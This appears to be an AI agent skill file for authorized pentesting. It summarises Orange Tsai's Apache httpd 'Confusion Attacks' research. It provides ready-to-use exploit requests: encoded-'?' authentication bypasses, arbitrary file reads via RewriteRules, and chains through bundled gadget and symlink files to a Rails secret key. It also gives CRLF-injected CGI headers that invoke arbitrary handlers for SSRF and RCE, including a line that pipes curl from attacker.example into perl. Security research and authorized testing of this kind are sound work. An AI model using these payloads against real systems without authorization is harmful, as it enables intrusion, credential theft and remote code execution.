---
name: apache-confusion-attacks
description: >
  Use this skill during authorized bug bounty / pentest recon whenever a target runs Apache HTTP Server (httpd) — especially with mod_rewrite RewriteRules, mod_proxy, CGI-family handlers (mod_cgi/mod_cgid/mod_wsgi/mod_fastcgi/etc.), or File-based Access Control (Files directives, especially paired with PHP-FPM via SetHandler/FilesMatch). Covers Orange Tsai's "Confusion Attacks" research (Black Hat USA 2024): three architectural attack classes from Apache modules disagreeing about shared internal fields. Filename Confusion — a trailing "?" truncates the internal filename field, bypassing Files-based access control and misleading RewriteRule flag assignment (e.g. uploaded images executed as PHP). DocumentRoot Confusion — unsafe RewriteRules let you access files both with AND without the DocumentRoot prefix, enabling arbitrary file read (CGI/PHP source disclosure) and, via bundled OS package files/local gadgets/symlinks under /usr/share, escalating to XSS, LFI, SSRF, or RCE even with no custom web app installed. Handler Confusion — the content-type field gets reused as the handler name when unset, letting response-header injection invoke ANY internal Apache module handler, including proxying to arbitrary URLs/local unix sockets for full SSRF and RCE. Trigger on requests to review an Apache/httpd config or .htaccess, test file-based access control bypass, find SSRF/LFI/RCE on an Apache-fronted app, or "check for Apache confusion attacks".
metadata:
  source: https://blog.orange.tw/posts/2024-08-confusion-attacks-en/
---

# Apache HTTP Server "Confusion Attacks"

Orange Tsai's Black Hat USA 2024 research: architectural bugs from Apache's ~136 modules sharing one giant `request_rec` struct without a precise, agreed-upon meaning for several of its fields. Three attack classes, roughly a dozen exploitation primitives. Patched in httpd 2.4.60 for the specific CVEs listed, but **the underlying config patterns are still commonly deployed** — this is a config-and-fingerprinting hunt as much as a version check.

## Preconditions / fingerprinting

Check the Apache version and, if you have any way to see config (whitebox, or a leaked `.htaccess`/error page), look for `RewriteRule`, `<Files>` blocks, `SetHandler`/`AddHandler`/`AddType`, and any CGI-family module (`mod_cgi`, `mod_cgid`, `mod_wsgi`, `mod_fastcgi`, `mod_proxy_fcgi`, `mod_proxy_scgi`, `mod_perl`, `mod_asis`). Debian/Ubuntu-packaged httpd has specific default behaviors this research leans on (see DocumentRoot Confusion below) — fingerprint the OS/distro where possible (Server header, default error pages, `/usr/share/...` paths).

## 1. Filename Confusion

Root cause: `mod_rewrite` treats its `RewriteRule` substitution target as a URL and truncates it at a literal `?` (`splitout_queryargs`), even when the rule is meant to produce a filesystem path — but other modules (auth/access-control) still read the pre-truncation `r->filename` as a plain filesystem path.

**1-1. Path Truncation.** Given:
```
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"
```
Normal request: `/user/orange` → serves `/var/user/orange/profile.yml`. Append an encoded `?` inside the captured group to truncate everything after it:
```
GET /user/orange%2Fsecret.yml%3F
```
→ serves `/var/user/orange/secret.yml` instead — you've truncated off the hardcoded `/profile.yml` suffix and substituted your own filename. Test anywhere a `RewriteRule` capture group feeds a hardcoded path suffix.

**1-2. Mislead RewriteFlag Assignment.** Given a rule that conditionally adds a handler based on regex match against the *original* URL, but truncation happens *after* that match:
```
RewriteRule ^(.+\.php)$ $1 [H=application/x-httpd-php]
```
Upload a file that doesn't end in `.php` (e.g. `1.gif` containing embedded PHP), then request it with an appended encoded `?` plus `.php`:
```
GET /upload/1.gif%3fooo.php
```
The regex still needs to match `.php` at the point of evaluation — request as `/upload/1.gif%3Fooo.php` so the rule sees `...ooo.php` as matching, then truncation drops back to serving `1.gif` — but now with the PHP handler flag attached, executing embedded code in the "image."

**1-3. ACL Bypass (`<Files>` + PHP-FPM).** A very common real-world pattern:
```
<Files "admin.php">
    AuthType Basic
    Require valid-user
</Files>
```
paired with (equally common, often the OS-default PHP-FPM config):
```
<FilesMatch ".+\.ph(?:ar|p|tml)$">
    SetHandler "proxy:unix:/run/php/php-fpm.sock|fcgi://localhost"
</FilesMatch>
```
Request `admin.php%3Fooo.php` (i.e., `admin.php?ooo.php` with the `?` percent-encoded). The `<Files>` auth check compares against the *unencoded, untruncated* filename `admin.php?ooo.php`, which doesn't literally equal `admin.php` — so no auth is required. But `mod_proxy`/PHP-FPM strips everything from the `?` onward when resolving the actual script to execute, landing back on `admin.php` — **executed with zero authentication**. This pattern isn't limited to `admin.php`: check any `<Files>`-protected PHP endpoint (control panels, `phpinfo()` pages restricted by IP, `adminer.php`, `xmlrpc.php`, CLI-only scripts like `cron.php` blocked via `Deny from all`) fronted by PHP-FPM.

## 2. DocumentRoot Confusion

Root cause: for **any** `RewriteRule` in `Server Config`/`VirtualHost` context, Apache tries the rewritten path **both with and without the DocumentRoot prefix** — this is intentional/documented behavior, but almost nobody realizes the "without DocumentRoot" branch exists and is reachable.

Given (this exact pattern is even in Apache's **own official documentation examples**):
```
DocumentRoot /var/www/html
RewriteRule "^/html/(.*)$" "/$1.html"
```
Requesting `/html/about` tries **both** `/about.html` (root-relative) and `/var/www/html/about.html` (DocumentRoot-relative). Any `RewriteRule` whose target prefix you can influence is a potential arbitrary-file-read primitive — common real-world patterns include static-compression rules (`RewriteRule "^(.*)\.(css|js|ico|svg)" "$1\.$2.gz"`), old-URL redirects (`RewriteRule "^/oldwebsite/(.*)$" "/$1"`), and CORS-preflight-200 rules.

**2-1. Server-Side Source Code Disclosure.** Combine the DocumentRoot-escape with Path Truncation (§1-1) to reach absolute filesystem paths and read files **as static content instead of executing them** — e.g. reach a CGI script by its absolute path outside the `ScriptAlias`-bound prefix, or reach a PHP file via a virtual host that doesn't have PHP execution configured, both of which cause the raw source to be returned instead of run.

**2-2. Local Gadgets Manipulation.** Once you can read arbitrary files under `/usr/share` (allowed by default on Debian/Ubuntu: `<Directory /usr/share> Require all granted </Directory>`, versus `/` being `Require all denied` by default), hunt for known "gadget" files bundled by installed OS packages — pre-existing scripts/pages that themselves become vulnerabilities once reachable:
- **Info disclosure:** `/usr/share/doc/websocketd/examples/php/dump-env.php` (leaks env vars if PHP present); default web roots for other services accidentally left under `/usr/share` (`/usr/share/nginx/html/`, `/usr/share/jetty9/...`).
- **XSS:** `/usr/share/libreoffice/help/help.html`'s language-switcher JS reflects a URL param into a redirect — usable even on targets with zero custom web app.
- **LFI:** package example/debug scripts like `/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php`, `/usr/share/javascript/jquery-jfeed/proxy.php`, Moodle plugin debug scripts.
- **SSRF:** `/usr/share/php/magpierss/scripts/magpie_debug.php`.
- **RCE:** old bundled/leftover PHPUnit (CVE-2017-9841), or a read-only phpLiteAdmin copy with its well-known default password.

Build an inventory of installed-package gadget files worth checking for on any Debian/Ubuntu Apache target — this list will grow; treat it as a starting point, not exhaustive.

**2-3. Jailbreak from `/usr/share` via Symlinks.** `FollowSymLinks` is enabled by default on Debian/Ubuntu httpd (and implicitly elsewhere). Look for symlinks inside package directories under `/usr/share` pointing **outside** it into `/etc`, `/var/lib`, etc. — these let you escape the `/usr/share` jail entirely. Known examples: Cacti (`/usr/share/cacti/site/` → `/var/log/cacti/`), Solr (`/usr/share/solr/{data,conf}/` → `/var/lib/solr/data`, `/etc/solr/conf/`), MediaWiki config, SimpleSAMLphp config. Worked example: Redmine's `/usr/share/redmine/instances/` → `/var/lib/redmine/` → (second hop) `/etc/redmine/default/`, exposing `secret_key.txt` — Redmine's Rails `secret_key_base`. With that key, forge a signed+encrypted Marshal payload in a cookie for classic Rails cookie-deserialization RCE.

## 3. Handler Confusion

Root cause: legacy code (present since 1996) makes `ap_invoke_handler()` fall back to using `r->content_type` as `r->handler` whenever `r->handler` itself is unset — meaning `AddType` and `AddHandler` have historically been interchangeable. The problem: `r->content_type` is *also* the field used for the outgoing response's `Content-Type` header, and Apache cannot distinguish between the two uses of that one field.

**3-1. Overwrite the Handler (info leak).** If any module accidentally overwrites `r->content_type` before the handler-invocation point — the documented case is a ModSecurity bug (not fully patched as of publication) mishandling `AP_FILTER_ERROR`, causing an unintended second/overwritten response with `Content-Type: text/html` — a request that should execute as PHP instead gets served as plain text, **leaking PHP source code**. Trigger candidate: send a malformed `Content-Length` header and see if the response contains raw, unexecuted PHP/script source instead of the rendered output. Affects any `AddType`-based or `mod_php`+`AddType`-based handler config if ModSecurity (or a similarly-behaving module) is present.

**3-2. Invoke Arbitrary Handlers (the big one).** If you can control the **response headers** coming back from a CGI-family script (via CRLF injection in the script's own header-writing logic, or full SSRF-style header control), you can trigger RFC 3875 §6.2.2's "Local Redirect Response" behavior: a CGI response with `Status: 200` and a `Location:` header starting with `/` makes Apache **internally re-process the request**, and critically, `ap_internal_redirect_handler()` copies the **current** `r->content_type` onto the new internal request before re-invoking the handler-resolution logic — so whatever `Content-Type` your CGI response set becomes the new request's **handler name**. This affects every CGI-family module: `mod_cgi`, `mod_cgid`, `mod_wsgi`, `mod_uwsgi`, `mod_fastcgi`, `mod_perl`, `mod_asis`, `mod_fcgid`, `mod_proxy_scgi`, and more.

Generic payload shape (CRLF-injectable CGI response header):
```
Location:/ooo\r\n
Content-Type:<target-handler-value>\r\n
\r\n
```
Concrete escalations, all using the same primitive with a different `Content-Type` value:
- **3-2-1. Info disclosure:** `Content-Type: server-status` invokes the built-in `server-status` handler even if it's configured `Require local` — you've bypassed that restriction entirely.
- **3-2-2. Script misinterpretation:** `Content-Type: application/x-httpd-php` against an uploaded image path turns it into an executed PHP backdoor.
- **3-2-2 (full SSRF):** `Content-Type: proxy:http://internal-target/` invokes `mod_proxy` with **full header and response control** — a complete SSRF, not just blind. Note: `mod_proxy` auto-adds `X-Forwarded-For`, which blocks it against EC2/GCP metadata endpoints specifically (their metadata protections check for that header) — still fully usable against arbitrary other internal targets.
- **3-2-3. Local Unix socket access:** `Content-Type: proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php` reaches PHP-FPM's local socket directly, executing any file you can plant under `/tmp` (or wherever the app allows uploads) as PHP.
- **3-2-4. Full RCE via PEAR:** on the official PHP Docker image (which bundles `pearcmd.php`), chain the local-socket primitive with PEAR's `run-tests` command-injection trick (see Phith0n's "Docker PHP LFI Summary" for the underlying gadget) for command execution:
  ```
  Location:/ooo?+run-tests+-ui+$(curl${IFS}attacker.example/x|perl)+alltests.php
  Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php
  ```

**Where to find the CRLF injection point in practice:** any first-party or third-party CGI script that reflects user input into a `Location:`-style redirect header without sanitizing newlines is your entry point — this is often dismissed/reported as "just an XSS via header injection," but per this research it can chain to full SSRF or RCE, so don't under-rate a CRLF/header-injection finding on a CGI-backed endpoint.

## 4. Related standalone CVEs worth checking for

- **CVE-2024-38472** (Windows UNC SSRF): `apr_filepath_merge()` on Windows accepts UNC paths; `\\attacker-server\path` coerces NTLM auth to an attacker host, chainable to RCE via NTLM relay. Two triggers: directly via the HTTP request parser (needs `AllowEncodedSlashes On`, and on httpd > 2.4.49 also `MergeSlashes Off`), or via an uploaded `.var` type-map file (Type-Map/`AddHandler type-map var` is enabled by default on Debian/Ubuntu) with a UNC path in its URI field.
- **CVE-2024-39573** (SSRF via full `RewriteRule` prefix control): if you have full control of a `RewriteRule` substitution's prefix in Server Config/VirtualHost context, `RewriteRule ^/broken(.*) $1` style rules let you invoke `mod_proxy` directly: `GET /brokenproxy:unix:/run/[...]|http://path/to`.

## Reporting checklist

- Which primitive(s) applied (Filename/DocumentRoot/Handler Confusion, with sub-primitive number), the exact request(s), and the config pattern that enabled it (paste the relevant `RewriteRule`/`<Files>`/`SetHandler` if visible).
- For Local Gadgets findings, name the OS package providing the gadget file — helps the target understand this isn't "their" app-level bug.
- For Handler Confusion chains, show the full CRLF-injected CGI response and the resulting internal-redirect behavior.
- Recommend: update to httpd ≥ 2.4.60 for the patched CVEs; more importantly, avoid absolute-path-producing `RewriteRule` substitutions without `[END]`/proper anchoring, avoid `<Files>`-based auth in front of PHP-FPM (use `<Location>`/proxy-aware auth instead), and treat any CGI header-injection bug as chainable to SSRF/RCE rather than "just" XSS.
